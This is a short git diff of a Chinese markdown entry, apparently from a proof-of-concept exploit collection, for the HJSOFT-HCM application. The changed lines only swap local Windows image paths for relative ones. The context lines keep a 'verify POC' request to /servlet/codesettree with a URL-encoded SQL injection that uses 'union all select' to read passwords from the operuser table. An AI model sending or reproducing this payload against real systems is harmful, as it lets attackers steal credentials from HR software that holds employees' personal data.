@@ -18,7 +18,7 @@ app="HJSOFT-HCM"
 
 登陆页面
 
-![image-20230704113309837](D:\TMP_FILE\awesome-poc\webapp\images\image-20230704113309837.png)
+![image-20230704113309837](./images/image-20230704113309837.png)
 
 验证POC
 
@@ -27,4 +27,4 @@ app="HJSOFT-HCM"
 /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cpassword~20from~20operuser~20~2d~2d
 ```
 
-![image-20230704113329354](D:\TMP_FILE\awesome-poc\webapp\images\image-20230704113329354.png)
+![image-20230704113329354](./images/image-20230704113329354.png)
